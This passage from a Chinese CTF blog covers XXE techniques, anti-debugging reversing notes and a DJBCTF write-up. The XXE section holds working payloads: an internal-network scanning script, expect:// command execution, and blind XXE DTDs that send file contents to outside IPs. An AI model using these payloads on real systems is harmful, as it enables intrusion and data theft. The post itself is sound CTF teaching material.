/etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件，就有大致的探测方向。 123456789101112131415161718192021222324252627282930313233import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;# &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string): xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#x27;&quot;&#x27; + string + &#x27;&quot;&#x27; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot; &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot; send_xml(xml)def send_xml(xml): headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125; x = requests.post(&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;, data=xml, headers=headers, timeout=5).text coded_string = x.split(&#x27; &#x27;)[-2] # a little split to get only the base64 encoded value print(coded_string)# print(base64.b64decode(coded_string))for i in range(1, 255): try: i = str(i) ip = &#x27;10.0.0.&#x27; + i string = &#x27;php://filter/convert.base64-encode/resource=http://&#x27; + ip + &#x27;/&#x27; print(string) build_xml(string) except:continue HTTP内网主机端口扫描 找到内网一台主机，想要知道攻击点在哪，还需要进行端口扫描，端口扫描的脚本与主机探测类似，只要把IP地址固定，然后循环遍历端口，当然一般端口是通过响应的时间的长短判断该该端口是否开放的。除了这种方法，我们还能结合 burpsuite 进行端口探测。 RCE 主要是由于配置不当/开发内部应用导致的。如果足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令。 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;catalog&gt; &lt;core id=&quot;test101&quot;&gt; &lt;author&gt;John, Doe&lt;/author&gt; &lt;/core&gt;&lt;/catalog&gt; ​ 绕过（bypass）协议（如http）可以利用实体编码绕过。 双重实体编码 1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ENTITY % xml &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt; %xml;]&gt;&lt;!--编码内容--&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;&lt;core&gt; &lt;message&gt;&amp;xxe;&lt;/message&gt;&lt;/core&gt; data://协议 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;data://text/plain;base64,YWRtaW4=&quot; &gt;]&gt;&lt;comment&gt;&lt;sender&gt;&amp;xxe;&lt;/sender&gt;&lt;content&gt;111&lt;/content&gt;&lt;/comment&gt; 12345678910&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMTguMjUuMTQuNDA6ODIwMC9oYWNrLmR0ZCc+&quot;&gt; %a; %b;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt;&lt;!--编码内容--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; file://协议+文件上传 12345678&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt; %a;]&gt;&lt;!--上传文件--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; php://filter协议+文件上传 1234567891011&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt; %a;]&gt; &lt;test&gt; &amp;hhh; &lt;/test&gt; &lt;!--上传文件--&gt;&lt;!ENTITY hhh SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt; 1234567891011&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt; %a;]&gt; &lt;test&gt; &amp;hhh; &lt;/test&gt; &lt;!--上传文件--&gt;PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg== 关键词（如 ENTITY, SYSTEM, file）使用编码方式绕过：UTF-16BE cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml 12345678910import requestsurl = &#x27;http://url/&#x27;payload = &quot;&quot;&quot;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://yourVPS/evil.dtd&quot;&gt;%remote;%int;%send;]&gt;&quot;&quot;&quot;payload = payload.encode(&#x27;utf-16&#x27;)requests.post(url, data=payload) evil.dtd 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://42.192.137.212/index.php?q=%file;&#x27;&gt;&quot;&gt; ​ 参考从几道CTF题学习Blind XXE","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"XXE","slug":"XXE","permalink":"https://lazzzaro.github.io/tags/XXE/"}],"author":"Lazzaro"},{"title":"静态反调试","slug":"reverse-静态反调试","date":"2021-02-24T14:23:51.000Z","updated":"2025-03-31T09:56:13.028Z","comments":true,"path":"2021/02/24/reverse-静态反调试/","permalink":"https://lazzzaro.github.io/2021/02/24/reverse-%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95/","excerpt":"","text":"​ 静态反调试技术只需要在程序运行之前进行一次破解即可解除全部限制，且不需要二次操作。而且静态反调试技术对于操作系统的依赖性非常大，相同的反调试技术在不同的操作系统表现可能不同。 参考： https://xz.aliyun.com/t/5685 https://xz.aliyun.com/t/5732/ https://xz.aliyun.com/t/6133 执行顺序__attribute__((constructor)) 属性修饰函数可使该函数先于 main 函数前执⾏。 .init_array 段的函数执行时机早于 main 函数。 ​ ptraceptrace即process tracer（进程跟踪），ptrace系统调用是 Linux 提供的一个调试进程的工具，其提供了一种可以观察和控制另一个进程（tracee）的方法，并检查和更改tracee的存储器和跟踪器，主要用于实施断点调试和系统调用跟踪，linux下常见的调试工具GDB原理就是基于ptrace。 ptrace检测是否处于调试状态。 ​ 加壳UPX手动脱壳 x32dbg打开，点击运行（F9到输入点），跳过ntdll的加载，等到程序输出特征字符串后，定位字符串 追踪过去后往上翻，找到运行入口 然后用插件Scylla来dump出这段，dump到一个程序，然后ida就可以正常分析了 ​ 花指令去花 IDA - 用 U 取消对应代码段的定义,然后在跳转位置出用热键 C 重新定义即可，中间的垃圾代码nop掉。 123456789101112131415161718192021# 脚本1import idautilsdef nop(addr,endaddr): while(addr&lt;endaddr): PatchByte(addr,0x90) addr+=1def undefine(addr,endaddr): while addr&lt;endaddr: MakeUnkn(addr,0) addr+=1def dejunkcode(addr,endaddr): while addr&lt;endaddr: MakeCode(addr) # 匹配模版 if Byte(addr)==0xe8 and Byte(addr+6)==0x12 and Byte(addr+7)==0x83: next=addr+10 nop(addr,next) addr=next continue addr+=ItemSize(addr)dejunkcode(0x00401000,0x00411E40) 12345678910111213141516171819202122# 脚本2import idautilsimport idcimport idaapistart = 0x401000end = 0x401627while (start &lt; end): if ((get_wide_byte(start) == 0xeb) and (get_wide_byte(start + 1) == 0xff)): ida_bytes.patch_byte(start, 0x90) ida_bytes.patch_byte(start + 1, 0x90) ida_bytes.patch_byte(start + 2, 0x90) start += 3 continue if ((get_wide_byte(start) == 0x66) and (get_wide_byte(start+1) == 0x41) and (get_wide_byte(start+2) == 0xbf)): idc.patch_qword(start, 0x9090909090909090) idc.patch_word(start+8, 0x9090) start += 10 start+=1 print(&#x27;OK!&#x27;) jz / jnz1234567start = 0x4019FCend = 0x401AD8while (start &lt; end): if ((get_wide_byte(start) == 0x74) and (get_wide_byte(start + 2) == 0x75)): ida_bytes.patch_byte(start + 4, 0x90) start += 1print(&#x27;OK!&#x27;) ​ SMCSMC（自修改代码，Self-Modifying Code），就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编，可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的字节码，IDA之类的反汇编器无法识别程序的正常逻辑。是一种反调试代码技术。 还原方法 首先确定需要加密的代码部分； 通过vs查看反汇编（或者OD、IDA等）可以确定对应部分的反汇编代码； 将这段代码手工用16进制编辑器覆盖为加密后的数据； 程序执行时则运行事先写好的代码先进行解密再运行。 参考 https://blog.csdn.net/qq_41923479/article/details/80377708https://blog.csdn.net/palmer9/article/details/105034093 脚本 IDA - File - Script file 1234567891011#include &lt;idc.idc&gt;static main()&#123; auto addr = 0x00401216; auto i = 0; for(i=0;i&lt;=0x43E;i++) &#123; PatchByte(addr+i,Byte(addr+i)^Byte(0x00409080+i)); &#125;&#125; ​ MOV混淆剑桥大学的Stephen Dolan证明了x86的mov指令可以完成几乎所有功能了（可能还需要jmp），其他指令都是“多余的”。这种混淆的特征就是：汇编代码的汇编指令几乎全部就是MOV。 1、 字符串的搜索是给我们最好的提示。 2、 MOV混淆是不会混淆函数的逻辑的。因此函数的逻辑还是不变的。 3、 大多数汇编代码的意思是可以猜测的。可以大概推测出具体操作了什么。 在这里提供一个开源的工具，是针对这的MOV混淆的工具：https://github.com/kirschju/demovfuscator，这个工具可以很好的帮助我们分析MOV混淆。 123456789101112131415161718192021222324252627282930#include&lt;idc.idc&gt;static isAscii(p)&#123; if(Byte(p)&lt;=&#x27;9&#x27; &amp;&amp; Byte(p)&gt;=&#x27;0&#x27;) return 1; if(Byte(p)&lt;=&#x27;z&#x27; &amp;&amp; Byte(p)&gt;=&#x27;a&#x27;) return 1; if(Byte(p)&lt;=&#x27;Z&#x27; &amp;&amp; Byte(p)&gt;=&#x27;A&#x27;) return 1; if(Byte(p)==&#x27;&#125;&#x27; || Byte(p)==&#x27;&#123;&#x27; || Byte(p)==&#x27;_&#x27; || Byte(p)==&#x27;@&#x27; || Byte(p)==&#x27;!&#x27; ||Byte(p)==&#x27;#&#x27; || Byte(p)==&#x27;&amp;&#x27; || Byte(p)==&#x27;*&#x27;) return 1; return 0;&#125;static main()&#123; auto start=0x0804824C,end=0x08053FA9; //代码段起止地址 auto point=start; auto str=&quot;&quot;; while(point&lt;=end) &#123; if(isAscii(point) &amp;&amp; Byte(point+1)==0 &amp;&amp; Byte(point+2)==0 &amp;&amp; Byte(point+3)==0) &#123; Message(&quot;%X %c\\n&quot;,point,Byte(point)); str=str+Byte(point); &#125; point=point+1; &#125; Message(&quot;%s\\n&quot;,str);&#125; ​ 虚拟机（VM）虚拟机：自己定义一套指令，在程序中能有一套函数和结构解释自己定义的指令并执行功能。 vm（虚拟机保护）是一种基于虚拟机的代码保护技术。他将基于x86汇编系统中的可执行代码转换为字节码指令系统的代码。来达到不被轻易篡改和逆向的目的。 简单来说就是出题人通过实现一个小型的虚拟机，把程序的代码转换为程序设计者自定义的操作码（opcode）然后在程序执行时通过解释操作码，执行对应的函数，从而实现程序原有的功能。 VMRUN：虚拟机入口函数 dispatcher：调度器，用于解释opcode，并选择对应的Handler函数执行，当Handler执行完后会跳回这里，形成一个循环。 opcode：程序可执行代码转换成的操作码 Handler：各种功能对象模块 一般步骤分析VM结构-&gt;分析opcode-&gt;编写parser-&gt;re算法 VM结构常见类型：基于栈、基于队列、基于信号量 opcode： 与VM数据结构对应的指令 ：push pop 运算指令：add、sub、mul ​ OLLVM混淆（LLVM） D810插件 https://github.com/joydo/d810 obpo插件 https://github.com/obpo-project/obpo-plugin 基于SnowGirls的deflat，利用angr框架实现去除控制流平坦化。 python3 deflat.py -f check_passwd_x8664_flat --addr 0x400530 LLVM多种格式 xx.c （源代码） xx.ll （LLVM字节码的文本表示） xx.s （机器汇编码表示的汇编文件） xx.bc （LLVM字节码的二进制形式） xx.out （可执行的二进制文件） 常用转换： 1234567clang test.bc -o testllvm-dis test.bc -o test.llllvm-as test.ll -o test.bcllc test.bc -o test.sgcc hello.s -o hellogcc -c -fPIE hello.s -o hello ​ TLSThreadLocalStorage(TLS)，是Windows为解决一个进程中多个线程同时访问全局变量而提供的机制。TLS可以简单地由操作系统代为完成整个互斥过程，也可以由用户自己编写控制信号量的函数。当进程中的线程访问预先制定的内存空间时，操作系统会调用系统默认的或用户自定义的信号量函数，保证数据的完整性与正确性。 而当Coder选择使用自己编写的信号量函数时，在应用程序初始化阶段，系统将要调用一个由用户编写的初始化函数以完成信号量的初始化以及其他的一些初始化工作。此调用必须在程序真正开始执行到入口点之前就完成，以保证程序执行的正确性。 TLS回调函数的执行，与数据的初始化，都在程序入口点之前执行，TLS是整个程序最早运行的地方，所以可以用这个特性，执行一些特殊操作。然后在最后程序退出时还会调用一次。 TLS反调试： 往定义的TLS函数里写代码。 OD调试程序的时候，要先找到程序的入口点，跟拿着钥匙开门一样，找到孔，才能插钥匙。TLS回调函数，由于可以在程序中最早运行的时候执行，可以把在调试器检测到入口点之前，它自己检测是否存在调试。例如，检测加载环境是不是“OllyDbg”等。 解法： 可以通过patch掉TLS回调来反反调试，但既然它用到了isDebuggerPresent，我们也可以通过nop填充来让调试能够继续运行。 Tls_callback() 函数： 第二个参数Reason可以有四个值，分别是 DLL_PROCESS_ATTACH、DLL_THREAD_ATTACH、DLL_THREAD_DETACH、DLL_PROCESS_DETACH，这四个值分别对应的时期是进程启动、线程启动、线程退出、进程退出，具体的值分别对应1，2，3，0。几次调用TLS回调函数的顺序也是1-2-3-0即DLL_PROCESS_ATTACH-&gt;DLL_THREAD_ATTACH-&gt;DLL_THREAD_DETACH-&gt;DLL_PROCESS_DETACH。 ​ 异常异常触发后的顺序 优先顺序：调试器 &gt; VEH &gt; SEH SEH如果程序引发了异常，程序将利用Windows的一种异常处理机制 SEH（Structured Exception Handling）机制处理异常，在处理过程中对程序进行一定的修改。常见形式：__try&#123;...&#125; __except(filter)&#123;...&#125;。 由于SEH中的很多代码不会被IDA反编译出来，所以它常常被用来反静态分析：程序员在try块中的某些情况下故意触发一些异常，来执行except块中他们想要隐藏起来的代码。 简而言之，就像它们的名字一样，程序先执行try块中的逻辑，如果try中产生了一些异常的情况（可以简单理解为程序发生了一些意外），就会执行except中的代码来处理异常；反之，如果try块中没有产生异常，except块就不会被执行。 ​ VEHVEH，向量化异常处理（Vectored Exception Handling），它优先于SEH执行，当VEH处理了异常就不会提交给SEH。 VEH是全局链表，每个VEH按顺序被调用，VEH可返回两个值：EXCEPTION_CONTINUE_SEARCH、EXCEPTION_CONTINUE_EXECUTION。EXCEPTION_CONTINUE_SEARCH把异常交给下一个VEH处理，即不处理；EXCEPTION_CONTINUE_EXECUTION 则表示处理该异常。 可以通过AddVectoredExceptionHandler函数和RemoveVectoredExceptionHandler函数进行插入VEH和移除VEH。 SEH是基于线程的，而VEH是基于进程的。 因为很清楚的可以看到SEH的数据结构是保存在栈空间的，直接在函数体内用push来处理，而VEH是以双链表的形式保存在堆里面。","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"反调试","slug":"反调试","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"}],"author":"Lazzaro"},{"title":"CTFshow 大吉大利杯DJBCTF","slug":"match-CTFshow-大吉大利杯DJBCTF","date":"2021-01-24T13:28:29.000Z","updated":"2021-04-27T11:54:43.213Z","comments":true,"path":"2021/01/24/match-CTFshow-大吉大利杯DJBCTF/","permalink":"https://lazzzaro.github.io/2021/01/24/match-CTFshow-%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AFDJBCTF/","excerpt":"","text":"比赛：CTFshow 大吉大利杯简称：大吉杯 DJB平台：https://ctf.show开始：2021/1/23 9:00结束：2021/1/24 22:00规则：1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：wp.ctf.show2 公平竞技，独立比赛3 服务器不要爆破，不要攻击服务器，不要扫描!!!4 奖品：新春月饼一份，单项前三定制量子水杯一个5 题目征集：https://shimo.im/docs/YP3tVqPJTxD6jhdt 出题：4 crypto + 1 reverse WEBveryphp 123456789101112131415161718192021222324252627282930313233&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;config.php&quot;);class qwq&#123; function __wakeup()&#123; die(&quot;Access Denied!&quot;); &#125; static function oao()&#123; show_source(&quot;config.php&quot;); &#125;&#125;$str = file_get_contents(&quot;php://input&quot;);if(preg_match(&#x27;/\\`|\\_|\\.|%|\\*|\\~|\\^|\\&#x27;|\\&quot;|\\;|\\(|\\)|\\]|g|e|l|i|\\//is&#x27;,$str))&#123; die(&quot;I am sorry but you have to leave.&quot;);&#125;else&#123; extract($_POST);&#125;if(isset($shaw_root))&#123; if(preg_match(&#x27;/^\\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\\D*?(abc.*?)p(hp)*\\@R(s|r).$/&#x27;, $shaw_root)&amp;&amp; strlen($shaw_root)===29)&#123; echo $hint; &#125;else&#123; echo &quot;Almost there.&quot;.&quot;&lt;br&gt;&quot;; &#125;&#125;else&#123; echo &quot;&lt;br&gt;&quot;.&quot;Input correct parameters&quot;.&quot;&lt;br&gt;&quot;; die();&#125;if($ans===$SecretNumber)&#123; echo &quot;&lt;br&gt;&quot;.&quot;Congratulations!&quot;.&quot;&lt;br&gt;&quot;; call_user_func($my_ans);&#125; extract($_POST)以POST方式传入变量。（第一个preg_match内的特殊字符完全无过滤作用，过滤的是$str变量。） 第一层，传入$shaw_root（如果上面preg_match过滤正常，则不能使用_，利用PHP特性，当参数名中含+/[/./空格这些字符时会被解析为_，传入shaw[root=1）；接着匹配preg_match内正则表达式，利用 https://regex101.com/ 可试出匹配的字符串，这里使用-a9&lt;b&gt;xxxxxx&gt;&gt;&gt;&gt;zzabcdphp@Rsx，得到hint： &gt;Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)==166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)===5 第二层，完全无需理会hint内容，照样利用extract($_POST)以POST方式传入参数ans=1和SecretNumber=1，覆盖原始变量值，再给call_user_func传入my_ans变量执行自定义函数，结合给出的类静态方法，传my_ans=qwq:oao得flag。 payload: shaw_root=-a9&lt;b&gt;xxxxxx&gt;&gt;&gt;&gt;zzabcdphp@Rsx&amp;ans=1&amp;SecretNumber=1&amp;my_ans=qwq::oao ​ spaceman 12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);highlight_file(__FILE__);class spaceman&#123; public $username; public $password; public function __construct($username,$password) &#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;ctfshowvip&#x27;) &#123; include(&quot;flag.php&quot;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125;&#125;function filter($string)&#123; return str_replace(&#x27;ctfshowup&#x27;,&#x27;ctfshow&#x27;,$string);&#125;$str = file_get_contents(&quot;php://input&quot;);if(preg_match(&#x27;/\\_|\\.|\\]|\\[/is&#x27;,$str))&#123; die(&quot;I am sorry but you have to leave.&quot;);&#125;else&#123; extract($_POST);&#125;$ser = filter(serialize(new spaceman($user_name,$pass_word)));$test = unserialize($ser);?&gt; 应该是出题失误，本想考反序列化字符逃逸，结果变成很简单的非预期。 同样，extract($_POST)以POST方式传入变量。（第一个preg_match内的特殊字符完全无过滤作用，过滤的是$str变量。） 传入user_name=1&amp;pass_word=ctfshowvip即得flag。 ​ MISC十八般兵器 刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙 hint1: JPHS hint2: 用Notepad++打开试试？ hint3: 前十种兵器对应10进制，后八种对应8进制 18张图，根据hint1，用jphs05隐写工具分别从18张图分别提取出txt文件（空密码）， 再根据hint2分别把每个txt文件最后一行的数字都摘出，前十个连接后十进制转字符串，后八个连接后八进制转字符串，字符串连接起来为flag。 ​ 请问大吉杯的签到是在这里签吗 flag为全部小写字母，没有空格 一张二维码，按照扫码内容能分离出提取出4张二维码，内容有提示意义， 第2张图的内容为还要往前走......是不是在这个路口转弯呢？，有问题，上stegsolve查看，在Random colour map就能看出端倪： 猪圈密码对照解密得flag。 ​ 牛年大吉 题目下载 蓝奏云下载地址：https://wws.lanzous.com/i1Ac0jybrvc 百度云下载地址： https://pan.baidu.com/s/14EXw7U4w0Am0oP_xRXfbqQ 提取码：ns2k hint1: 不要格式化哟，看看引导扇区是不是丢东西了 hint2: 压缩包密码在图片文件头里 vhd磁盘文件，用DiskGenius装载，修复磁盘，能提取出!lag.7z和牛年大吉.png两个文件，根据hint2，7z压缩包密码为png文件头89504E47，解压得flag。 ​ 拼图v2.0 有手就行，没手的可以拿眼睛去瞪 打开环境，带旋转的拼图，gaps不方便，纯手工上。 ​ AA86 在一台旧电脑上（大约在16位操作系统还能跑的年代）发现了这个文件，挖掘它的秘密 hint: 请仔细阅读题目描述(5毛一条，去掉括号) 根据提示关键是16位操作系统。 Google搜索DOS AA86，在第2条结果可发现AA86文件编码说明： Aa86 is a .COM file encoder by Yosuke Hasegawa that encodes binaries using only symbols characters, with a decoder. 把文件加上后缀.COM，找个MSDOS在虚拟机安装，再运行AA86.COM得flag。 ​ CRYPTOeasysignin 1234567891011121314151617181920212223242526272829from Crypto.Util.number import getPrime, isPrime, bytes_to_longfrom random import getrandbitsfrom secret import flagdef genpq(k): while True: p = getPrime((k + 3) // 4) q = getPrime((k + 3) // 4) if ((p ** 2) * (q ** 2)).bit_length() == k: return (p, q)def genseq(t, k): x = getrandbits(k) y = getrandbits(k) r = [] r += [pow(x * getrandbits(k)+y, pow(getrandbits(k), t - 1, t), t)] for i in range(len(flag)): r += [pow(x * r[i] +y, pow(getrandbits(k), t - 1, t), t)] return r(p, q) = genpq(2021)e = getPrime(0x0123)r = [genseq(p, p.bit_length() // 4), genseq(q, q.bit_length() // 4), genseq(e, e.bit_length() // 4)]c = pow(bytes_to_long(flag), e, 2021 * p * q)out = open(&#x27;output.txt&#x27;,&#x27;w&#x27;)out.write(str(r) + &quot;\\n&quot;)out.write(str(c) + &quot;\\n&quot;)out.close() 套LCG壳的RSA。 首先解决LCG问题， 观察 genseq() 函数，发现 pow(getrandbits(k), t - 1, t) 为混淆式，由于传入的 $t$ 为质数，可根据费马小定理化为1，再按照正常方式生成递归状态数组 $r_{i+1}=(x \\cdot r_i+y) \\pmod t$，其中乘数 $x$、增量$y$、模数$t$ 均未知。 三次调用genseq()函数，产生以 $p,q,e$ 为模数的递归状态数组 $r_p,r_q,r_e$，利用三种值未知情况下的攻击方式，求出 $p,q,e$ 值。 再解简单RSA即得flag。 123456789101112131415161718192021222324252627282930313233343536373839404142from functools import reducefrom math import gcddef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&#x27;modular inverse does not exist&#x27;) else: return x % mdef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus)rp = []rq = []re = []xp, yp, p = crack_unknown_modulus(rp)xq, yq, q = crack_unknown_modulus(rq)xe, ye, e = crack_unknown_modulus(re)print(p)print(q)print(e)#RSA步骤略 ​ luckybase baseの试炼 hint: b64decode(‘452/4520’)=’㝿㝴’ 123456789101112131415161718#!/usr/bin/env python3.8from base64 import b64encodefrom random import randint, randomfrom os import getcwdprint(&#x27;\\n\\n&#x27;)print(open(getcwd() + &#x27;/&#x27; + __file__, &#x27;r&#x27;).read())print(&#x27;\\n\\n&#x27;)luck = randint(0, 2021) * random()print(luck)good = eval(b64encode(input().encode(&#x27;utf-8&#x27;)))if abs(good - luck) &lt; 1e-10: print(open(&#x27;/flag&#x27;).read())else: print(&#x27;Back luck 2021???&#x27;) 其实算半个misc题。 代码逻辑为，输入内容，使得UTF-8字符以base64编码后结果与给定的float值近似（$10^{-10}$误差内）。 base64编码的结果包含的字符有ABCDEFGHIJKLMNOPQRSVWXYZabcdeghiklmnopqrstuvxyz0123456789+/，那么可以使用数字0123456789和运算符号+或/凑出计算式来表示0.1，以及用e+数字凑出科学计数法。 由于任意浮点数都可以表示为 $\\sum\\limits_{i,j&lt;k}(d_i \\cdot 0.1\\cdot 10^{-j})$，其中 $d_i$ 表示第 $i$ 位的数字，$j$ 表示对应的指数值，如 $1.143=11 \\cdot 0.1 \\cdot 10^{0}+4 \\cdot 0.1 \\cdot 10^{-1}+3 \\cdot 0.1 \\cdot 10^{-2}$ 根据hint，$0.1$可表示为452/4520，$10^{-j}$可以表示为e+数字，系数 $d_i$ 可以变为对应的项的叠加，以 $1.143$ 为例，即 452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e01+452/4520e01+452/4520e01+452/4520e01+452/4520e02+452/4520e02+452/4520e02 接下来寻找满足base64特性（编码：每3字符→4字符，解码：每4字符→3字符）并且编解码一致的e+数字串，有： e00+对应&#123;M&gt;，e01+对应&#123;M~，e04+对应&#123;N&gt;，e05+对应&#123;N~，e08+对应&#123;O&gt;，e09+对应&#123;O~，e10+对应&#123;]&gt;，e11+对应&#123;]~，e013对应&#123;Mw。 将生成值按上面公式拆解，替换为对应特征串，nc交互： 1234567891011121314151617181920212223242526272829303132333435363738#coding=utf-8#注意py2和py3关于float值的输出长度不同，py2输出值过短会导致误差不满足要求，此用py3from pwn import *from base64 import b64encoder = remote(&#x27;111.231.70.44&#x27;, 28044)r.recvuntil(&#x27;Back luck 2021???&#x27;)r.recvline()r.recvline()r.recvline()r.recvline()num = r.recvline().strip(b&#x27;.&#x27;)print(num)num = num.split(b&#x27;.&#x27;)a = int(num[0])b = num[1].decode(&#x27;utf-8&#x27;)table = &#123;&#x27;0.1/&#x27;: &#x27;㝿㝴&#x27;, &#x27;e00+&#x27;: &#x27;&#123;M&gt;&#x27;, &#x27;e01+&#x27;: &#x27;&#123;M~&#x27;, &#x27;e04+&#x27;: &#x27;&#123;N&gt;&#x27;, &#x27;e05+&#x27;: &#x27;&#123;N~&#x27;, &#x27;e08+&#x27;: &#x27;&#123;O&gt;&#x27;, &#x27;e09+&#x27;: &#x27;&#123;O~&#x27;, &#x27;e10+&#x27;: &#x27;&#123;]&gt;&#x27;, &#x27;e11+&#x27;: &#x27;&#123;]~&#x27;, &#x27;e013&#x27;: &#x27;&#123;Mw&#x27;&#125;payload = &quot;0.1/e00+&quot;*(a*10+int(b[0]))payload += &quot;0.1/e01+&quot;*(int(b[1]))payload += &quot;0.1/e04+&quot;*(int(b[2:5]))payload += &quot;0.1/e05+&quot;*(int(b[5]))payload += &quot;0.1/e08+&quot;*(int(b[6:9]))payload += 